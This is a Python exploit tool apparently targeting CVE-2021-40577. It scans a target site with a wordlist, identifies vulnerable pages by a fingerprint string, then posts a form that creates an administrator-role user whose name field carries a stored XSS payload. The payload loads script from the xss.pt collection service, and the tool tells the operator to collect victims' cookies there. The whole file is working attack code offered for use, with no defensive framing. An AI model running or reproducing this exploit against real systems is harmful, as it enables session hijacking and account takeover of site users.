#coding=utf-8
import requests
from threading import *
import sys
import getopt
'''requests用于请求目标站点；
threading用于启用多线程；
sys用于解析命令行参数；
getopt用于处理命令行参数；'''
# 程序标识
def banner():
    print("\n********************")
    name = '''
.__      .__  ___.     .__   __     .__ 
|  |__   |__| \_ |__   |__| |  | __ |__|
|  |  \  |  |  | __ \  |  | |  |/ / |  |
|   Y  \ |  |  | \_\ \ |  | |    <  |  |
|___|  / |__|  |___  / |__| |__|_ \ |__|
     \/            \/            \/     

    '''
    print(name)
    print("hibiki-CVE2021-40577 v0.1")
    print("***********************")
# 程序用法
def usage():
    print("用法：")
    print("     -w:网址 (http://XD.com/FUZZ)")
    print("     -t:线程数")
    print("     -f:字典文件")
    print("     -p:payload,默认请填%3CsCRiPt%2FSrC%3D%2F%2Fxss.pt%2Fybtp%3E")
    print("例子：hibiki.py -w http://zmister.com/FUZZ -t 5 -f commom.txt -p %3CsCRiPt%2FSrC%3D%2F%2Fxss.pt%2Fybtp%3E")
#创建线程并向目标站点发起请求以及获取响应
class request_performer(Thread):
    def __init__(self,word,url,payload):
        Thread.__init__(self)
        try:
            self.word = word.split("\n")[0]
            self.urly = url.replace('/FUZZ',self.word)#将FUZZ替换为字典
            self.url = self.urly
            self.pay = payload
            pass
        except Exception as e:
            print(e)
 #写一个类继承自Thread类，重写threading类中的run方法。用start方法启动线程 当函数结束时,线程自动终止
    def run(self):
        try:
            #根据指纹找到漏洞网站
            r = requests.get(self.url)
            print(self.url,"-",str(r.status_code))
            fingerprint='Green Valley College Foundation, Inc'
            if (r.content.decode().find(fingerprint)>0):
                #print(r.content.decode())
                exm.append(self.url)
            i[0] = i[0] -1
        except Exception as e:
            print(e)
def exp(pay):
    try:
        form = {'deptid': '', 'U_NAME': pay, 'deptid': '', 'U_USERNAME': '1', 
'deptid': '', 'U_PASS': '', 'U_ROLE': 'Administrator', 'save': ''}
        anser=input("以下是疑似漏洞点,要加载漏洞利用吗?Y/N\n")
        for i in exm:
            print(i)
        if anser=='Y':
            print("请选择要攻击的目标0 ~",len(exm)-1)
            target=int(input())
            #加载payload
            requests.post(exm[target], form)
            print('请到对应的XSSpt上查看得到的cookie')
    except Exception as e:
        print(e)
#启动request_performer()类
#launcher_thread(words,threads,url)
def launcher_thread(names,th,url,payload):
    global i,exm
    i = []
    exm = []
    resultlist = []
    i.append(0)
    while len(names):
        try:
            if i[0] < th:
                n = names.pop(0)
                i[0] = i[0]+1
                #将参数构建成请求
                thread = request_performer(n,url,payload)
                thread.start()
                #主线程一直等待全部的子线程结束之后，主线程自身才结束，程序退出
                #让线程同步，即主线程任务结束之后，进入阻塞状态一直等待其他的子线程执行结束之后，主线程在终止
                thread.join()
                '''length = len(enumerate())
                print('当前运行的线程数为：%d' % length)'''
        except KeyboardInterrupt:
            print("用户停止了程序运行。完成探测")
            sys.exit()
    return True
#接收命令行中的参数将其传递给launcher_thread()函数
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        #getopt被用来解析命令行选项参数。就不用自己写东东处理argv了。
        opts,args = getopt.getopt(sys.argv[1:],"w:t:f:p:")
    except getopt.GetoptError:
        print("错误的参数")
        sys.exit()
    #测试代码
    print(opts)
    print(args)
    #opts   [('-h', ''), ('-o', 'file'), ('--help', ''), ('--output', 'out')]
    for opt,arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dicts = arg
        elif opt == '-t':
            threads = int(arg)
        elif opt == '-p':
            payload=arg

    try:
        f = open(dicts,'r')
        words = f.readlines()
    except Exception as e:
        print("打开文件错误：",dicts,"\n")
        print(e)
        sys.exit()
    launcher_thread(words,threads,url,payload)
    if len(exm):
        exp(payload)
        pass
if __name__ == '__main__':
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("用户停止了程序运行。完成探测")
